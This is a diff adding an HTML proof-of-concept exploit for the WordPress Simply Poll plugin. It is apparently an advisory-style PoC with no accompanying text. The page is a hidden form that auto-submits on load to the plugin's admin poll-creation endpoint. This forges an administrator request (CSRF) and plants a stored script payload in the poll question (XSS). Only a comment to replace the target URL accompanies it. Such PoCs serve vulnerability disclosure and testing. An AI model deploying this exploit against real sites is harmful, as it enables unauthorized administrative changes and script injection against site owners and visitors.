@@ -1,0 +1,27 @@
+[code]
+<html>
+<head>
+<title>Simply Poll CSRF and XSS</title>
+</head>
+<body>
+<!-- replace "127.0.0.1:9001/wordpress" -->
+<form action="http://127.0.0.1:9001/wordpress/wp-admin/admin.php?page=sp-add" method="post">
+<input type="hidden" name="question" value='Is CSRF+XSS possible?<script>alert(1)</script>' />
+<input type="hidden" name="answers[1][answer]" value="yes" />
+<input type="hidden" name="answers[2][answer]" value="no" />
+<input type="hidden" name="answers[3][answer]" value="maybe" />
+<input type="hidden" name="answers[4][answer]" value="" />
+<input type="hidden" name="answers[5][answer]" value="" />
+<input type="hidden" name="answers[4][answer]" value="" />
+<input type="hidden" name="answers[6][answer]" value="" />
+<input type="hidden" name="answers[7][answer]" value="" />
+<input type="hidden" name="answers[8][answer]" value="" />
+<input type="hidden" name="answers[9][answer]" value="" />
+<input type="hidden" name="answers[10][answer]" value="" />
+<input type="hidden" name="polledit" value="new" />
+</form>
+<script>document.forms[0].submit();</script>
+ 
+</body>
+</html>
+[/code]
